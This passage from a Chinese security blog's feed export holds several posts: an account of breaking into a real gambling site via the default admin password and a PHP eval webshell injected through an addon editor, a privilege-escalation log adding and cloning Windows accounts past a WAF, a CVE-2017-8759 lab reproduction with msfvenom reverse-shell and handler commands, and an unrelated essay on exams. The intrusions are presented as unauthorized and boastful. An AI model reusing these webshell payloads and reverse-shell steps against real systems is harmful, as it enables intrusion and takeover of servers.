    <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。<br>然后发了我一个app，我安装以后打开一看。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/01.png" alt="陪妹子玩游戏引起的风波"><br>卧槽，XXXX四个大字出现在我眼前<br>不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去…..)<br>祖国的生日结束以后…..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: <a href="http://xxxx.com/">http://xxxx.com/</a>。</p><h3 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h3><p>简单的搜集了下信息如下:<br>IP: XXX.XXX.XX.XX<br>旁站:无<br>cdn:无<br>脚本:php<br>中间件:nginx<br>框架:ThinkPHP<br>cms:vlcms</p><p>可以判断出服务器架构是:php+mysql+nginx+linux</p><h3 id="进后台"><a href="#进后台" class="headerlink" title="进后台"></a>进后台</h3><p>说到这个后台嘛…….很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有……）<br>在url后面加上admin.php，会跳转到登录界面<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/02.png" alt="陪妹子玩游戏引起的风波"><br>测试了下弱口令(人品爆发)<br>admin   admin    失败<br>admin   123456   成功<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/03.png" alt="陪妹子玩游戏引起的风波"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>老规矩，知道cms先百度，一样，毛都没……<br>只能硬着头皮在后台翻了…..<br>这里admin用户权限已经是属于超级管理员了，权限是最高的了。<br>还有个数据库备份和用户配置<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/04.png" alt="陪妹子玩游戏引起的风波"><br>不过数据库是mysql的…..没屌用啊，此处感慨为啥不学学南方。<br>剩下的就是上传点了<br>上传点有点多，随便找了个上传点<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/05.png" alt="陪妹子玩游戏引起的风波"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/06.png" alt="陪妹子玩游戏引起的风波"><br>先上传张正常的图片看下上传功能是否有用<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/07.png" alt="陪妹子玩游戏引起的风波"><br>看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用）<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/08.png" alt="陪妹子玩游戏引起的风波"><br>然后各种上传绕过都试了，也是没用。</p><h3 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h3><p>看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/09.png" alt="陪妹子玩游戏引起的风波"><br>扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方）<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/10.png" alt="陪妹子玩游戏引起的风波"><br>修改url为<a href="http://xxxx.com/admin.php?s=/Addons/index">http://xxxx.com/admin.php?s=/Addons/index</a>，然后访问<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/11.png" alt="陪妹子玩游戏引起的风波"><br>和土豆研究了下这个插件，先点击快速创建<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/12.png" alt="陪妹子玩游戏引起的风波"><br>点击预览按钮可以看到代码。。。。。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/13.png" alt="陪妹子玩游戏引起的风波"><br>竟然能看到代码？这不是脱裤子找日吗？<br>思路：打算在这里写入一句话。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/14.png" alt="陪妹子玩游戏引起的风波"><br>顺手写了个一句话，然后点击预览发现被注释了。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/15.png" alt="陪妹子玩游戏引起的风波"><br>看来是有用的，那就好办了，闭合下注释和php末端。<br>最后的代码是**/?&gt; <?php @eval($_POST["a"]);?> &lt;?php /*<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/16.png" alt="陪妹子玩游戏引起的风波"><br>Ok，这样我们的一句话就写进去了。然后点击确定<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/17.png" alt="陪妹子玩游戏引起的风波"><br>卧槽，好激动。。。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/18.png" alt="陪妹子玩游戏引起的风波"><br>可是tm的地址呢？？？不过可以肯定的是，马是写进去了。<br>然后我又创建了一个插件，这次不打算完整闭合代码。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/19.png" alt="陪妹子玩游戏引起的风波"><br>这样肯定是出错的，然后我们点击确定<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/20.png" alt="陪妹子玩游戏引起的风波"><br>没错，正如你所见，报错了。刚才创建的名叫test1。<br>然后构造下我们之前创建名为Example的路径<br>地址为: <a href="http://xxxx.com/Addons/Example/ExampleAddon.class.php">http://xxxx.com/Addons/Example/ExampleAddon.class.php</a><br>然后请出菜刀，连接看看<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/21.png" alt="陪妹子玩游戏引起的风波"><br>连接成功，成功获取shell。<br>由于服务器Linux服务器我就不去提权了。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>这种棋牌网站，竟然来了，怎么能不留点东西呢<br>丢个txt文件走人<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/22.png" alt="陪妹子玩游戏引起的风波"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/23.png" alt="陪妹子玩游戏引起的风波"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次System权限下的过狗提权</title>
    <link href="/p/2978905e.html"/>
    <url>/p/2978905e.html</url>
    
    <content type="html"><![CDATA[<p>事情起因:某个朋友有个phpmyadmin的站拿不下shell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/01.png" alt="记一次System权限下的过狗提权"></p><a id="more"></a><p>拿shell的过程就不多说了，因为是用phpstudy搭建的站点(一般采用集成包搭建的都是system权限)，所以权限挺大的</p><p>首先看了下权限</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/02.png" alt="记一次System权限下的过狗提权"></p><p>确定是system，直接net user添加帐号</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/03.png" alt="记一次System权限下的过狗提权"></p><p>然后加入到管理组</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/04.png" alt="记一次System权限下的过狗提权"></p><p>拒绝访问。。。。查看下是不是有WAF</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/05.png" alt="记一次System权限下的过狗提权"></p><p>确定已经有安全狗了….竟然帐号添加了  但是没办法加入管理组</p><p>这时候y哥对我说直接克隆用户</p><p>然后上传exp</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/06.png" alt="记一次System权限下的过狗提权"></p><p>执行下，显示克隆成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/07.png" alt="记一次System权限下的过狗提权"></p><p>去查看下有没有开放3389</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/08.png" alt="记一次System权限下的过狗提权"></p><p>这里并没有显示3389端口，竟然这样，我们就去查看下他改成什么端口了(不过这里基本上就可以看出端口是3390了…..)</p><p>首先用tasklist /svc查看下服务，找到这个服务对应的PID号</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/09.png" alt="记一次System权限下的过狗提权"></p><p>然后用netstat –ano查看对应的端口</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/10.png" alt="记一次System权限下的过狗提权"></p><p>可以看出端口是3390，然后我们去连接下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/11.png" alt="记一次System权限下的过狗提权"></p><p>一连接上就自动登录QQ，屎都差点吓出来……….</p><p>以前写的一篇文章，没啥技术含量，此文只是做次笔记</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-8759漏洞复现</title>
    <link href="/p/c1a00b05.html"/>
    <url>/p/c1a00b05.html</url>
    
    <content type="html"><![CDATA[<p>漏洞介绍:<a href="http://www.freebuf.com/articles/system/147602.html">http://www.freebuf.com/articles/system/147602.html</a></p><p>贴上POC地址:<a href="https://github.com/bhdresh/CVE-2017-8759">https://github.com/bhdresh/CVE-2017-8759</a></p><p>由于kali2.0太卡，已被我抛弃，目前使用parrot系统。</p><p>先用命令将POC下载到本地</p><p><code>git clone https://github.com/bhdresh/CVE-2017-8759</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/01.png" alt="CVE-2017-8759漏洞复现"></p><a id="more"></a><p>我们进入到CVE-2017-8759这个文件夹，打开README.md文件查看下使用方法</p><p><code>sudo pluma README.md</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/02.png" alt="CVE-2017-8759漏洞复现"></p><pre><code class="hljs markdown"><span class="hljs-section">###### Example commands</span><span class="hljs-code">1) Generate malicious RTF file</span><span class="hljs-code">   # python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.txt</span><span class="hljs-code">2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler</span><span class="hljs-code">   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe &gt; /tmp/shell.exe</span><span class="hljs-code">   # msfconsole -x &quot;use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run&quot;</span><span class="hljs-code">3) Start toolkit in exploit mode to deliver local payload</span><span class="hljs-code">   # python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe</span></code></pre><p>我们先用命令<code>python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.0.124/test.txt</code>生成一个恶意的RTF文件(先用ifconfig命令查看下自己的IP，将里面的IP修改为自己的IP，我这里是192.168.0.124)</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/03.png" alt="CVE-2017-8759漏洞复现"></p><p>可以看到生成成功了，我们ls看下是否有这个文件</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/04.png" alt="CVE-2017-8759漏洞复现"></p><p>然后第二步，用msf生成Payload。</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=你监听的端口 -f exe &gt; /tmp/shell.exe</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/05.png" alt="CVE-2017-8759漏洞复现"></p><p>然后用msfconsole启动msf，需要等待些时间。</p><p>等启动好后我们配置下msf</p><pre><code class="hljs gams">msf &gt; use exploit/multi/handler msf exploit(handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">set payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>[-] The <span class="hljs-comment">value specified for payload is not valid.</span>msf <span class="hljs-comment">exploit(handler) &gt; set payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>payload <span class="hljs-comment">=&gt; windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>msf <span class="hljs-comment">exploit(handler) &gt; show options</span> Module <span class="hljs-comment">options (exploit</span>/multi/<span class="hljs-comment">handler):</span>   Name  <span class="hljs-comment">Current Setting  Required  Description</span>   ----  ---------------  --------  -----------Payload <span class="hljs-comment">options (windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp):</span>   Name      <span class="hljs-comment">Current Setting  Required  Description</span>   ----      ---------------  --------  -----------   EXITFUNC  <span class="hljs-comment">process          yes       Exit technique (Accepted:</span> <span class="hljs-comment">&#x27;&#x27;</span><span class="hljs-comment">, seh, thread, process, none)</span>   LHOST                      <span class="hljs-comment">yes       The listen address</span>   LPORT     <span class="hljs-comment">4444             yes       The listen port</span>Exploit <span class="hljs-comment">target:</span>   Id  <span class="hljs-comment">Name</span>   --  ----   0   Wildcard <span class="hljs-comment">Target</span>msf <span class="hljs-comment">exploit(handler) &gt; set lhost 192.168.0.124</span>lhost <span class="hljs-comment">=&gt; 192.168.0.124</span>msf <span class="hljs-comment">exploit(handler) &gt; set lport 4444</span>lport <span class="hljs-comment">=&gt; 4444</span>msf <span class="hljs-comment">exploit(handler) &gt; show options</span> Module <span class="hljs-comment">options (exploit</span>/multi/<span class="hljs-comment">handler):</span>   Name  <span class="hljs-comment">Current Setting  Required  Description</span>   ----  ---------------  --------  -----------Payload <span class="hljs-comment">options (windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp):</span>   Name      <span class="hljs-comment">Current Setting  Required  Description</span>   ----      ---------------  --------  -----------   EXITFUNC  <span class="hljs-comment">process          yes       Exit technique (Accepted:</span> <span class="hljs-comment">&#x27;&#x27;</span><span class="hljs-comment">, seh, thread, process, none)</span>   LHOST     <span class="hljs-comment">192.168.0.124    yes       The listen address</span>   LPORT     <span class="hljs-comment">4444             yes       The listen port</span>Exploit <span class="hljs-comment">target:</span>   Id  <span class="hljs-comment">Name</span>   --  ----   0   Wildcard <span class="hljs-comment">Target</span>msf <span class="hljs-comment">exploit(handler) &gt; exploit</span> [*] Exploit <span class="hljs-comment">running as background job 0.</span>[*] Started <span class="hljs-comment">reverse TCP handler on 192.168.0.124:4444</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/06.png" alt="CVE-2017-8759漏洞复现"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/07.png" alt="CVE-2017-8759漏洞复现"></p><p>监听成功，我们进行最后一步</p><p><code>python cve-2017-8759_toolkit.py -M exp -e http://192.168.0.124/shell.exe -l /tmp/shell.exe</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/08.png" alt="CVE-2017-8759漏洞复现"></p><p>我们把rtf文件拖动到win7虚拟机下打开</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/09.png" alt="CVE-2017-8759漏洞复现"></p><p>可以看到有反弹回来的信息了，不过貌似这系统的msf有问题，卡在那了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="CVE-2017-8759漏洞复现"></p><p>我们按ctrl+c停止，再session -l查看下会话列表</p><p>session -i选择会话</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="CVE-2017-8759漏洞复现"></p><p>成功，接下来怎么玩，我相信各位大佬比我清楚。</p><p>有POC就是牛逼。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>CVE-2017-8759</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又是一年高考季</title>
    <link href="/p/6c3385c5.html"/>
    <url>/p/6c3385c5.html</url>
    
    <content type="html"><![CDATA[<p>写个文章也算是打发下时间吧！</p><p>一转眼又过去了2年了，想想两年前的自己，浑浑噩噩的混完了高中。</p><p>依稀记得高考前一晚还差点和别人打架，具体原因也是因为那几个要好的朋友。</p><p>虽然现在很少联系，但他们一直都在心中。</p><p>高考的前几天，我们一起在走廊上感概，我们的高中经历了什么，一转眼就没了，也许到现在我们都没法得到答案。</p><a id="more"></a><p>虽然现在可以吹牛逼说自己高考考了211。别在意，我说的211是分数，不是学校。</p><p>出成绩那天，查完成绩的我仿佛和中彩票一样高兴。</p><p>记得数学是29，这是一个意外的分数，也许是自己隐藏实力太久了吧。</p><p>高中老师都说，大学会很轻松。但愿你不会抱着这种美好的幻想，我会告诉你，都是假的。</p><p>大学给了你疯的时间与机会，却没给你能够陪你一起疯的那群人。</p><p>大学给了我自由恋爱随心所欲的空间和时间，可是我却没有了喜欢的人。</p><p>大学吃饭是一帮人，玩游戏是一帮人，出去玩又是一帮人，而高中这些都是同一帮人。</p><p>关于大学的室友，能忍就忍吧，毕竟要在一起相处三年。</p><p>但是，如果遇到那种大半夜打游戏，还开声音的人，你应该知道怎么做的。</p><p>就像我们宿舍有几个，凌晨4点多还在那打游戏。</p><p>曾经的六人间，变成了现在的二人间。</p><p>一定要上个好大学，真的，好的大学才会让你感受到大学的意义，而辣鸡的大学只是在浪费青春。</p><p>题再难也就高中水平，高考再难顶多也就3天。</p><p>嗯，最后的话。</p><p>喜欢的人能告白还是告白了吧，最起码以后也不遗憾。讨厌的老师该原谅也就原谅了吧，毕竟也是陪你从高三闯出来的人。最好的朋友一定要有完美的告别，要么就保持关系不断。想哭就哭一场吧，这样的日子不多了。校服还是留着吧，这是真正意义上的青春。现在走在大街上，看到穿校服的会很羡慕，感觉那就是青春吧。</p><p>2017届考生，祝好运。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin新姿势getshell</title>
    <link href="/p/588d5ec8.html"/>
    <url>/p/588d5ec8.html</url>
    
